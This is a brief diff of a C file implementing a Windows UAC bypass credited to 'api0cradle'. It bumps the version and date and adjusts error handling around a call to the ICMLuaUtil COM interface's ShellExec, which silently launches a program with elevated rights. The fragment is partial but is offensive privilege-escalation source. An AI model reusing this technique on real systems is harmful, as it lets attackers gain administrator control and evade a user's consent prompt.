@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017 - 2021
+*  (C) COPYRIGHT AUTHORS, 2017 - 2022
 *
 *  TITLE:       API0CRADLE.C
 *
-*  VERSION:     3.58
+*  VERSION:     3.61
 *
-*  DATE:        01 Dec 2021
+*  DATE:        22 Jun 2022
 *
 *  UAC bypass method from Oddvar Moe aka api0cradle.
 *
@@ -32,7 +32,7 @@ NTSTATUS ucmCMLuaUtilShellExecMethod(
 )
 {
     NTSTATUS    MethodResult = STATUS_ACCESS_DENIED;
-    HRESULT     r = E_FAIL, hr_init;
+    HRESULT     r, hr_init;
     ICMLuaUtil* CMLuaUtil = NULL;
 
     hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
@@ -48,10 +48,8 @@ NTSTATUS ucmCMLuaUtilShellExecMethod(
         if (r != S_OK)
             break;
 
-        if (CMLuaUtil == NULL) {
-            r = E_OUTOFMEMORY;
+        if (CMLuaUtil == NULL)
             break;
-        }
 
         r = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil,
             lpszExecutable,
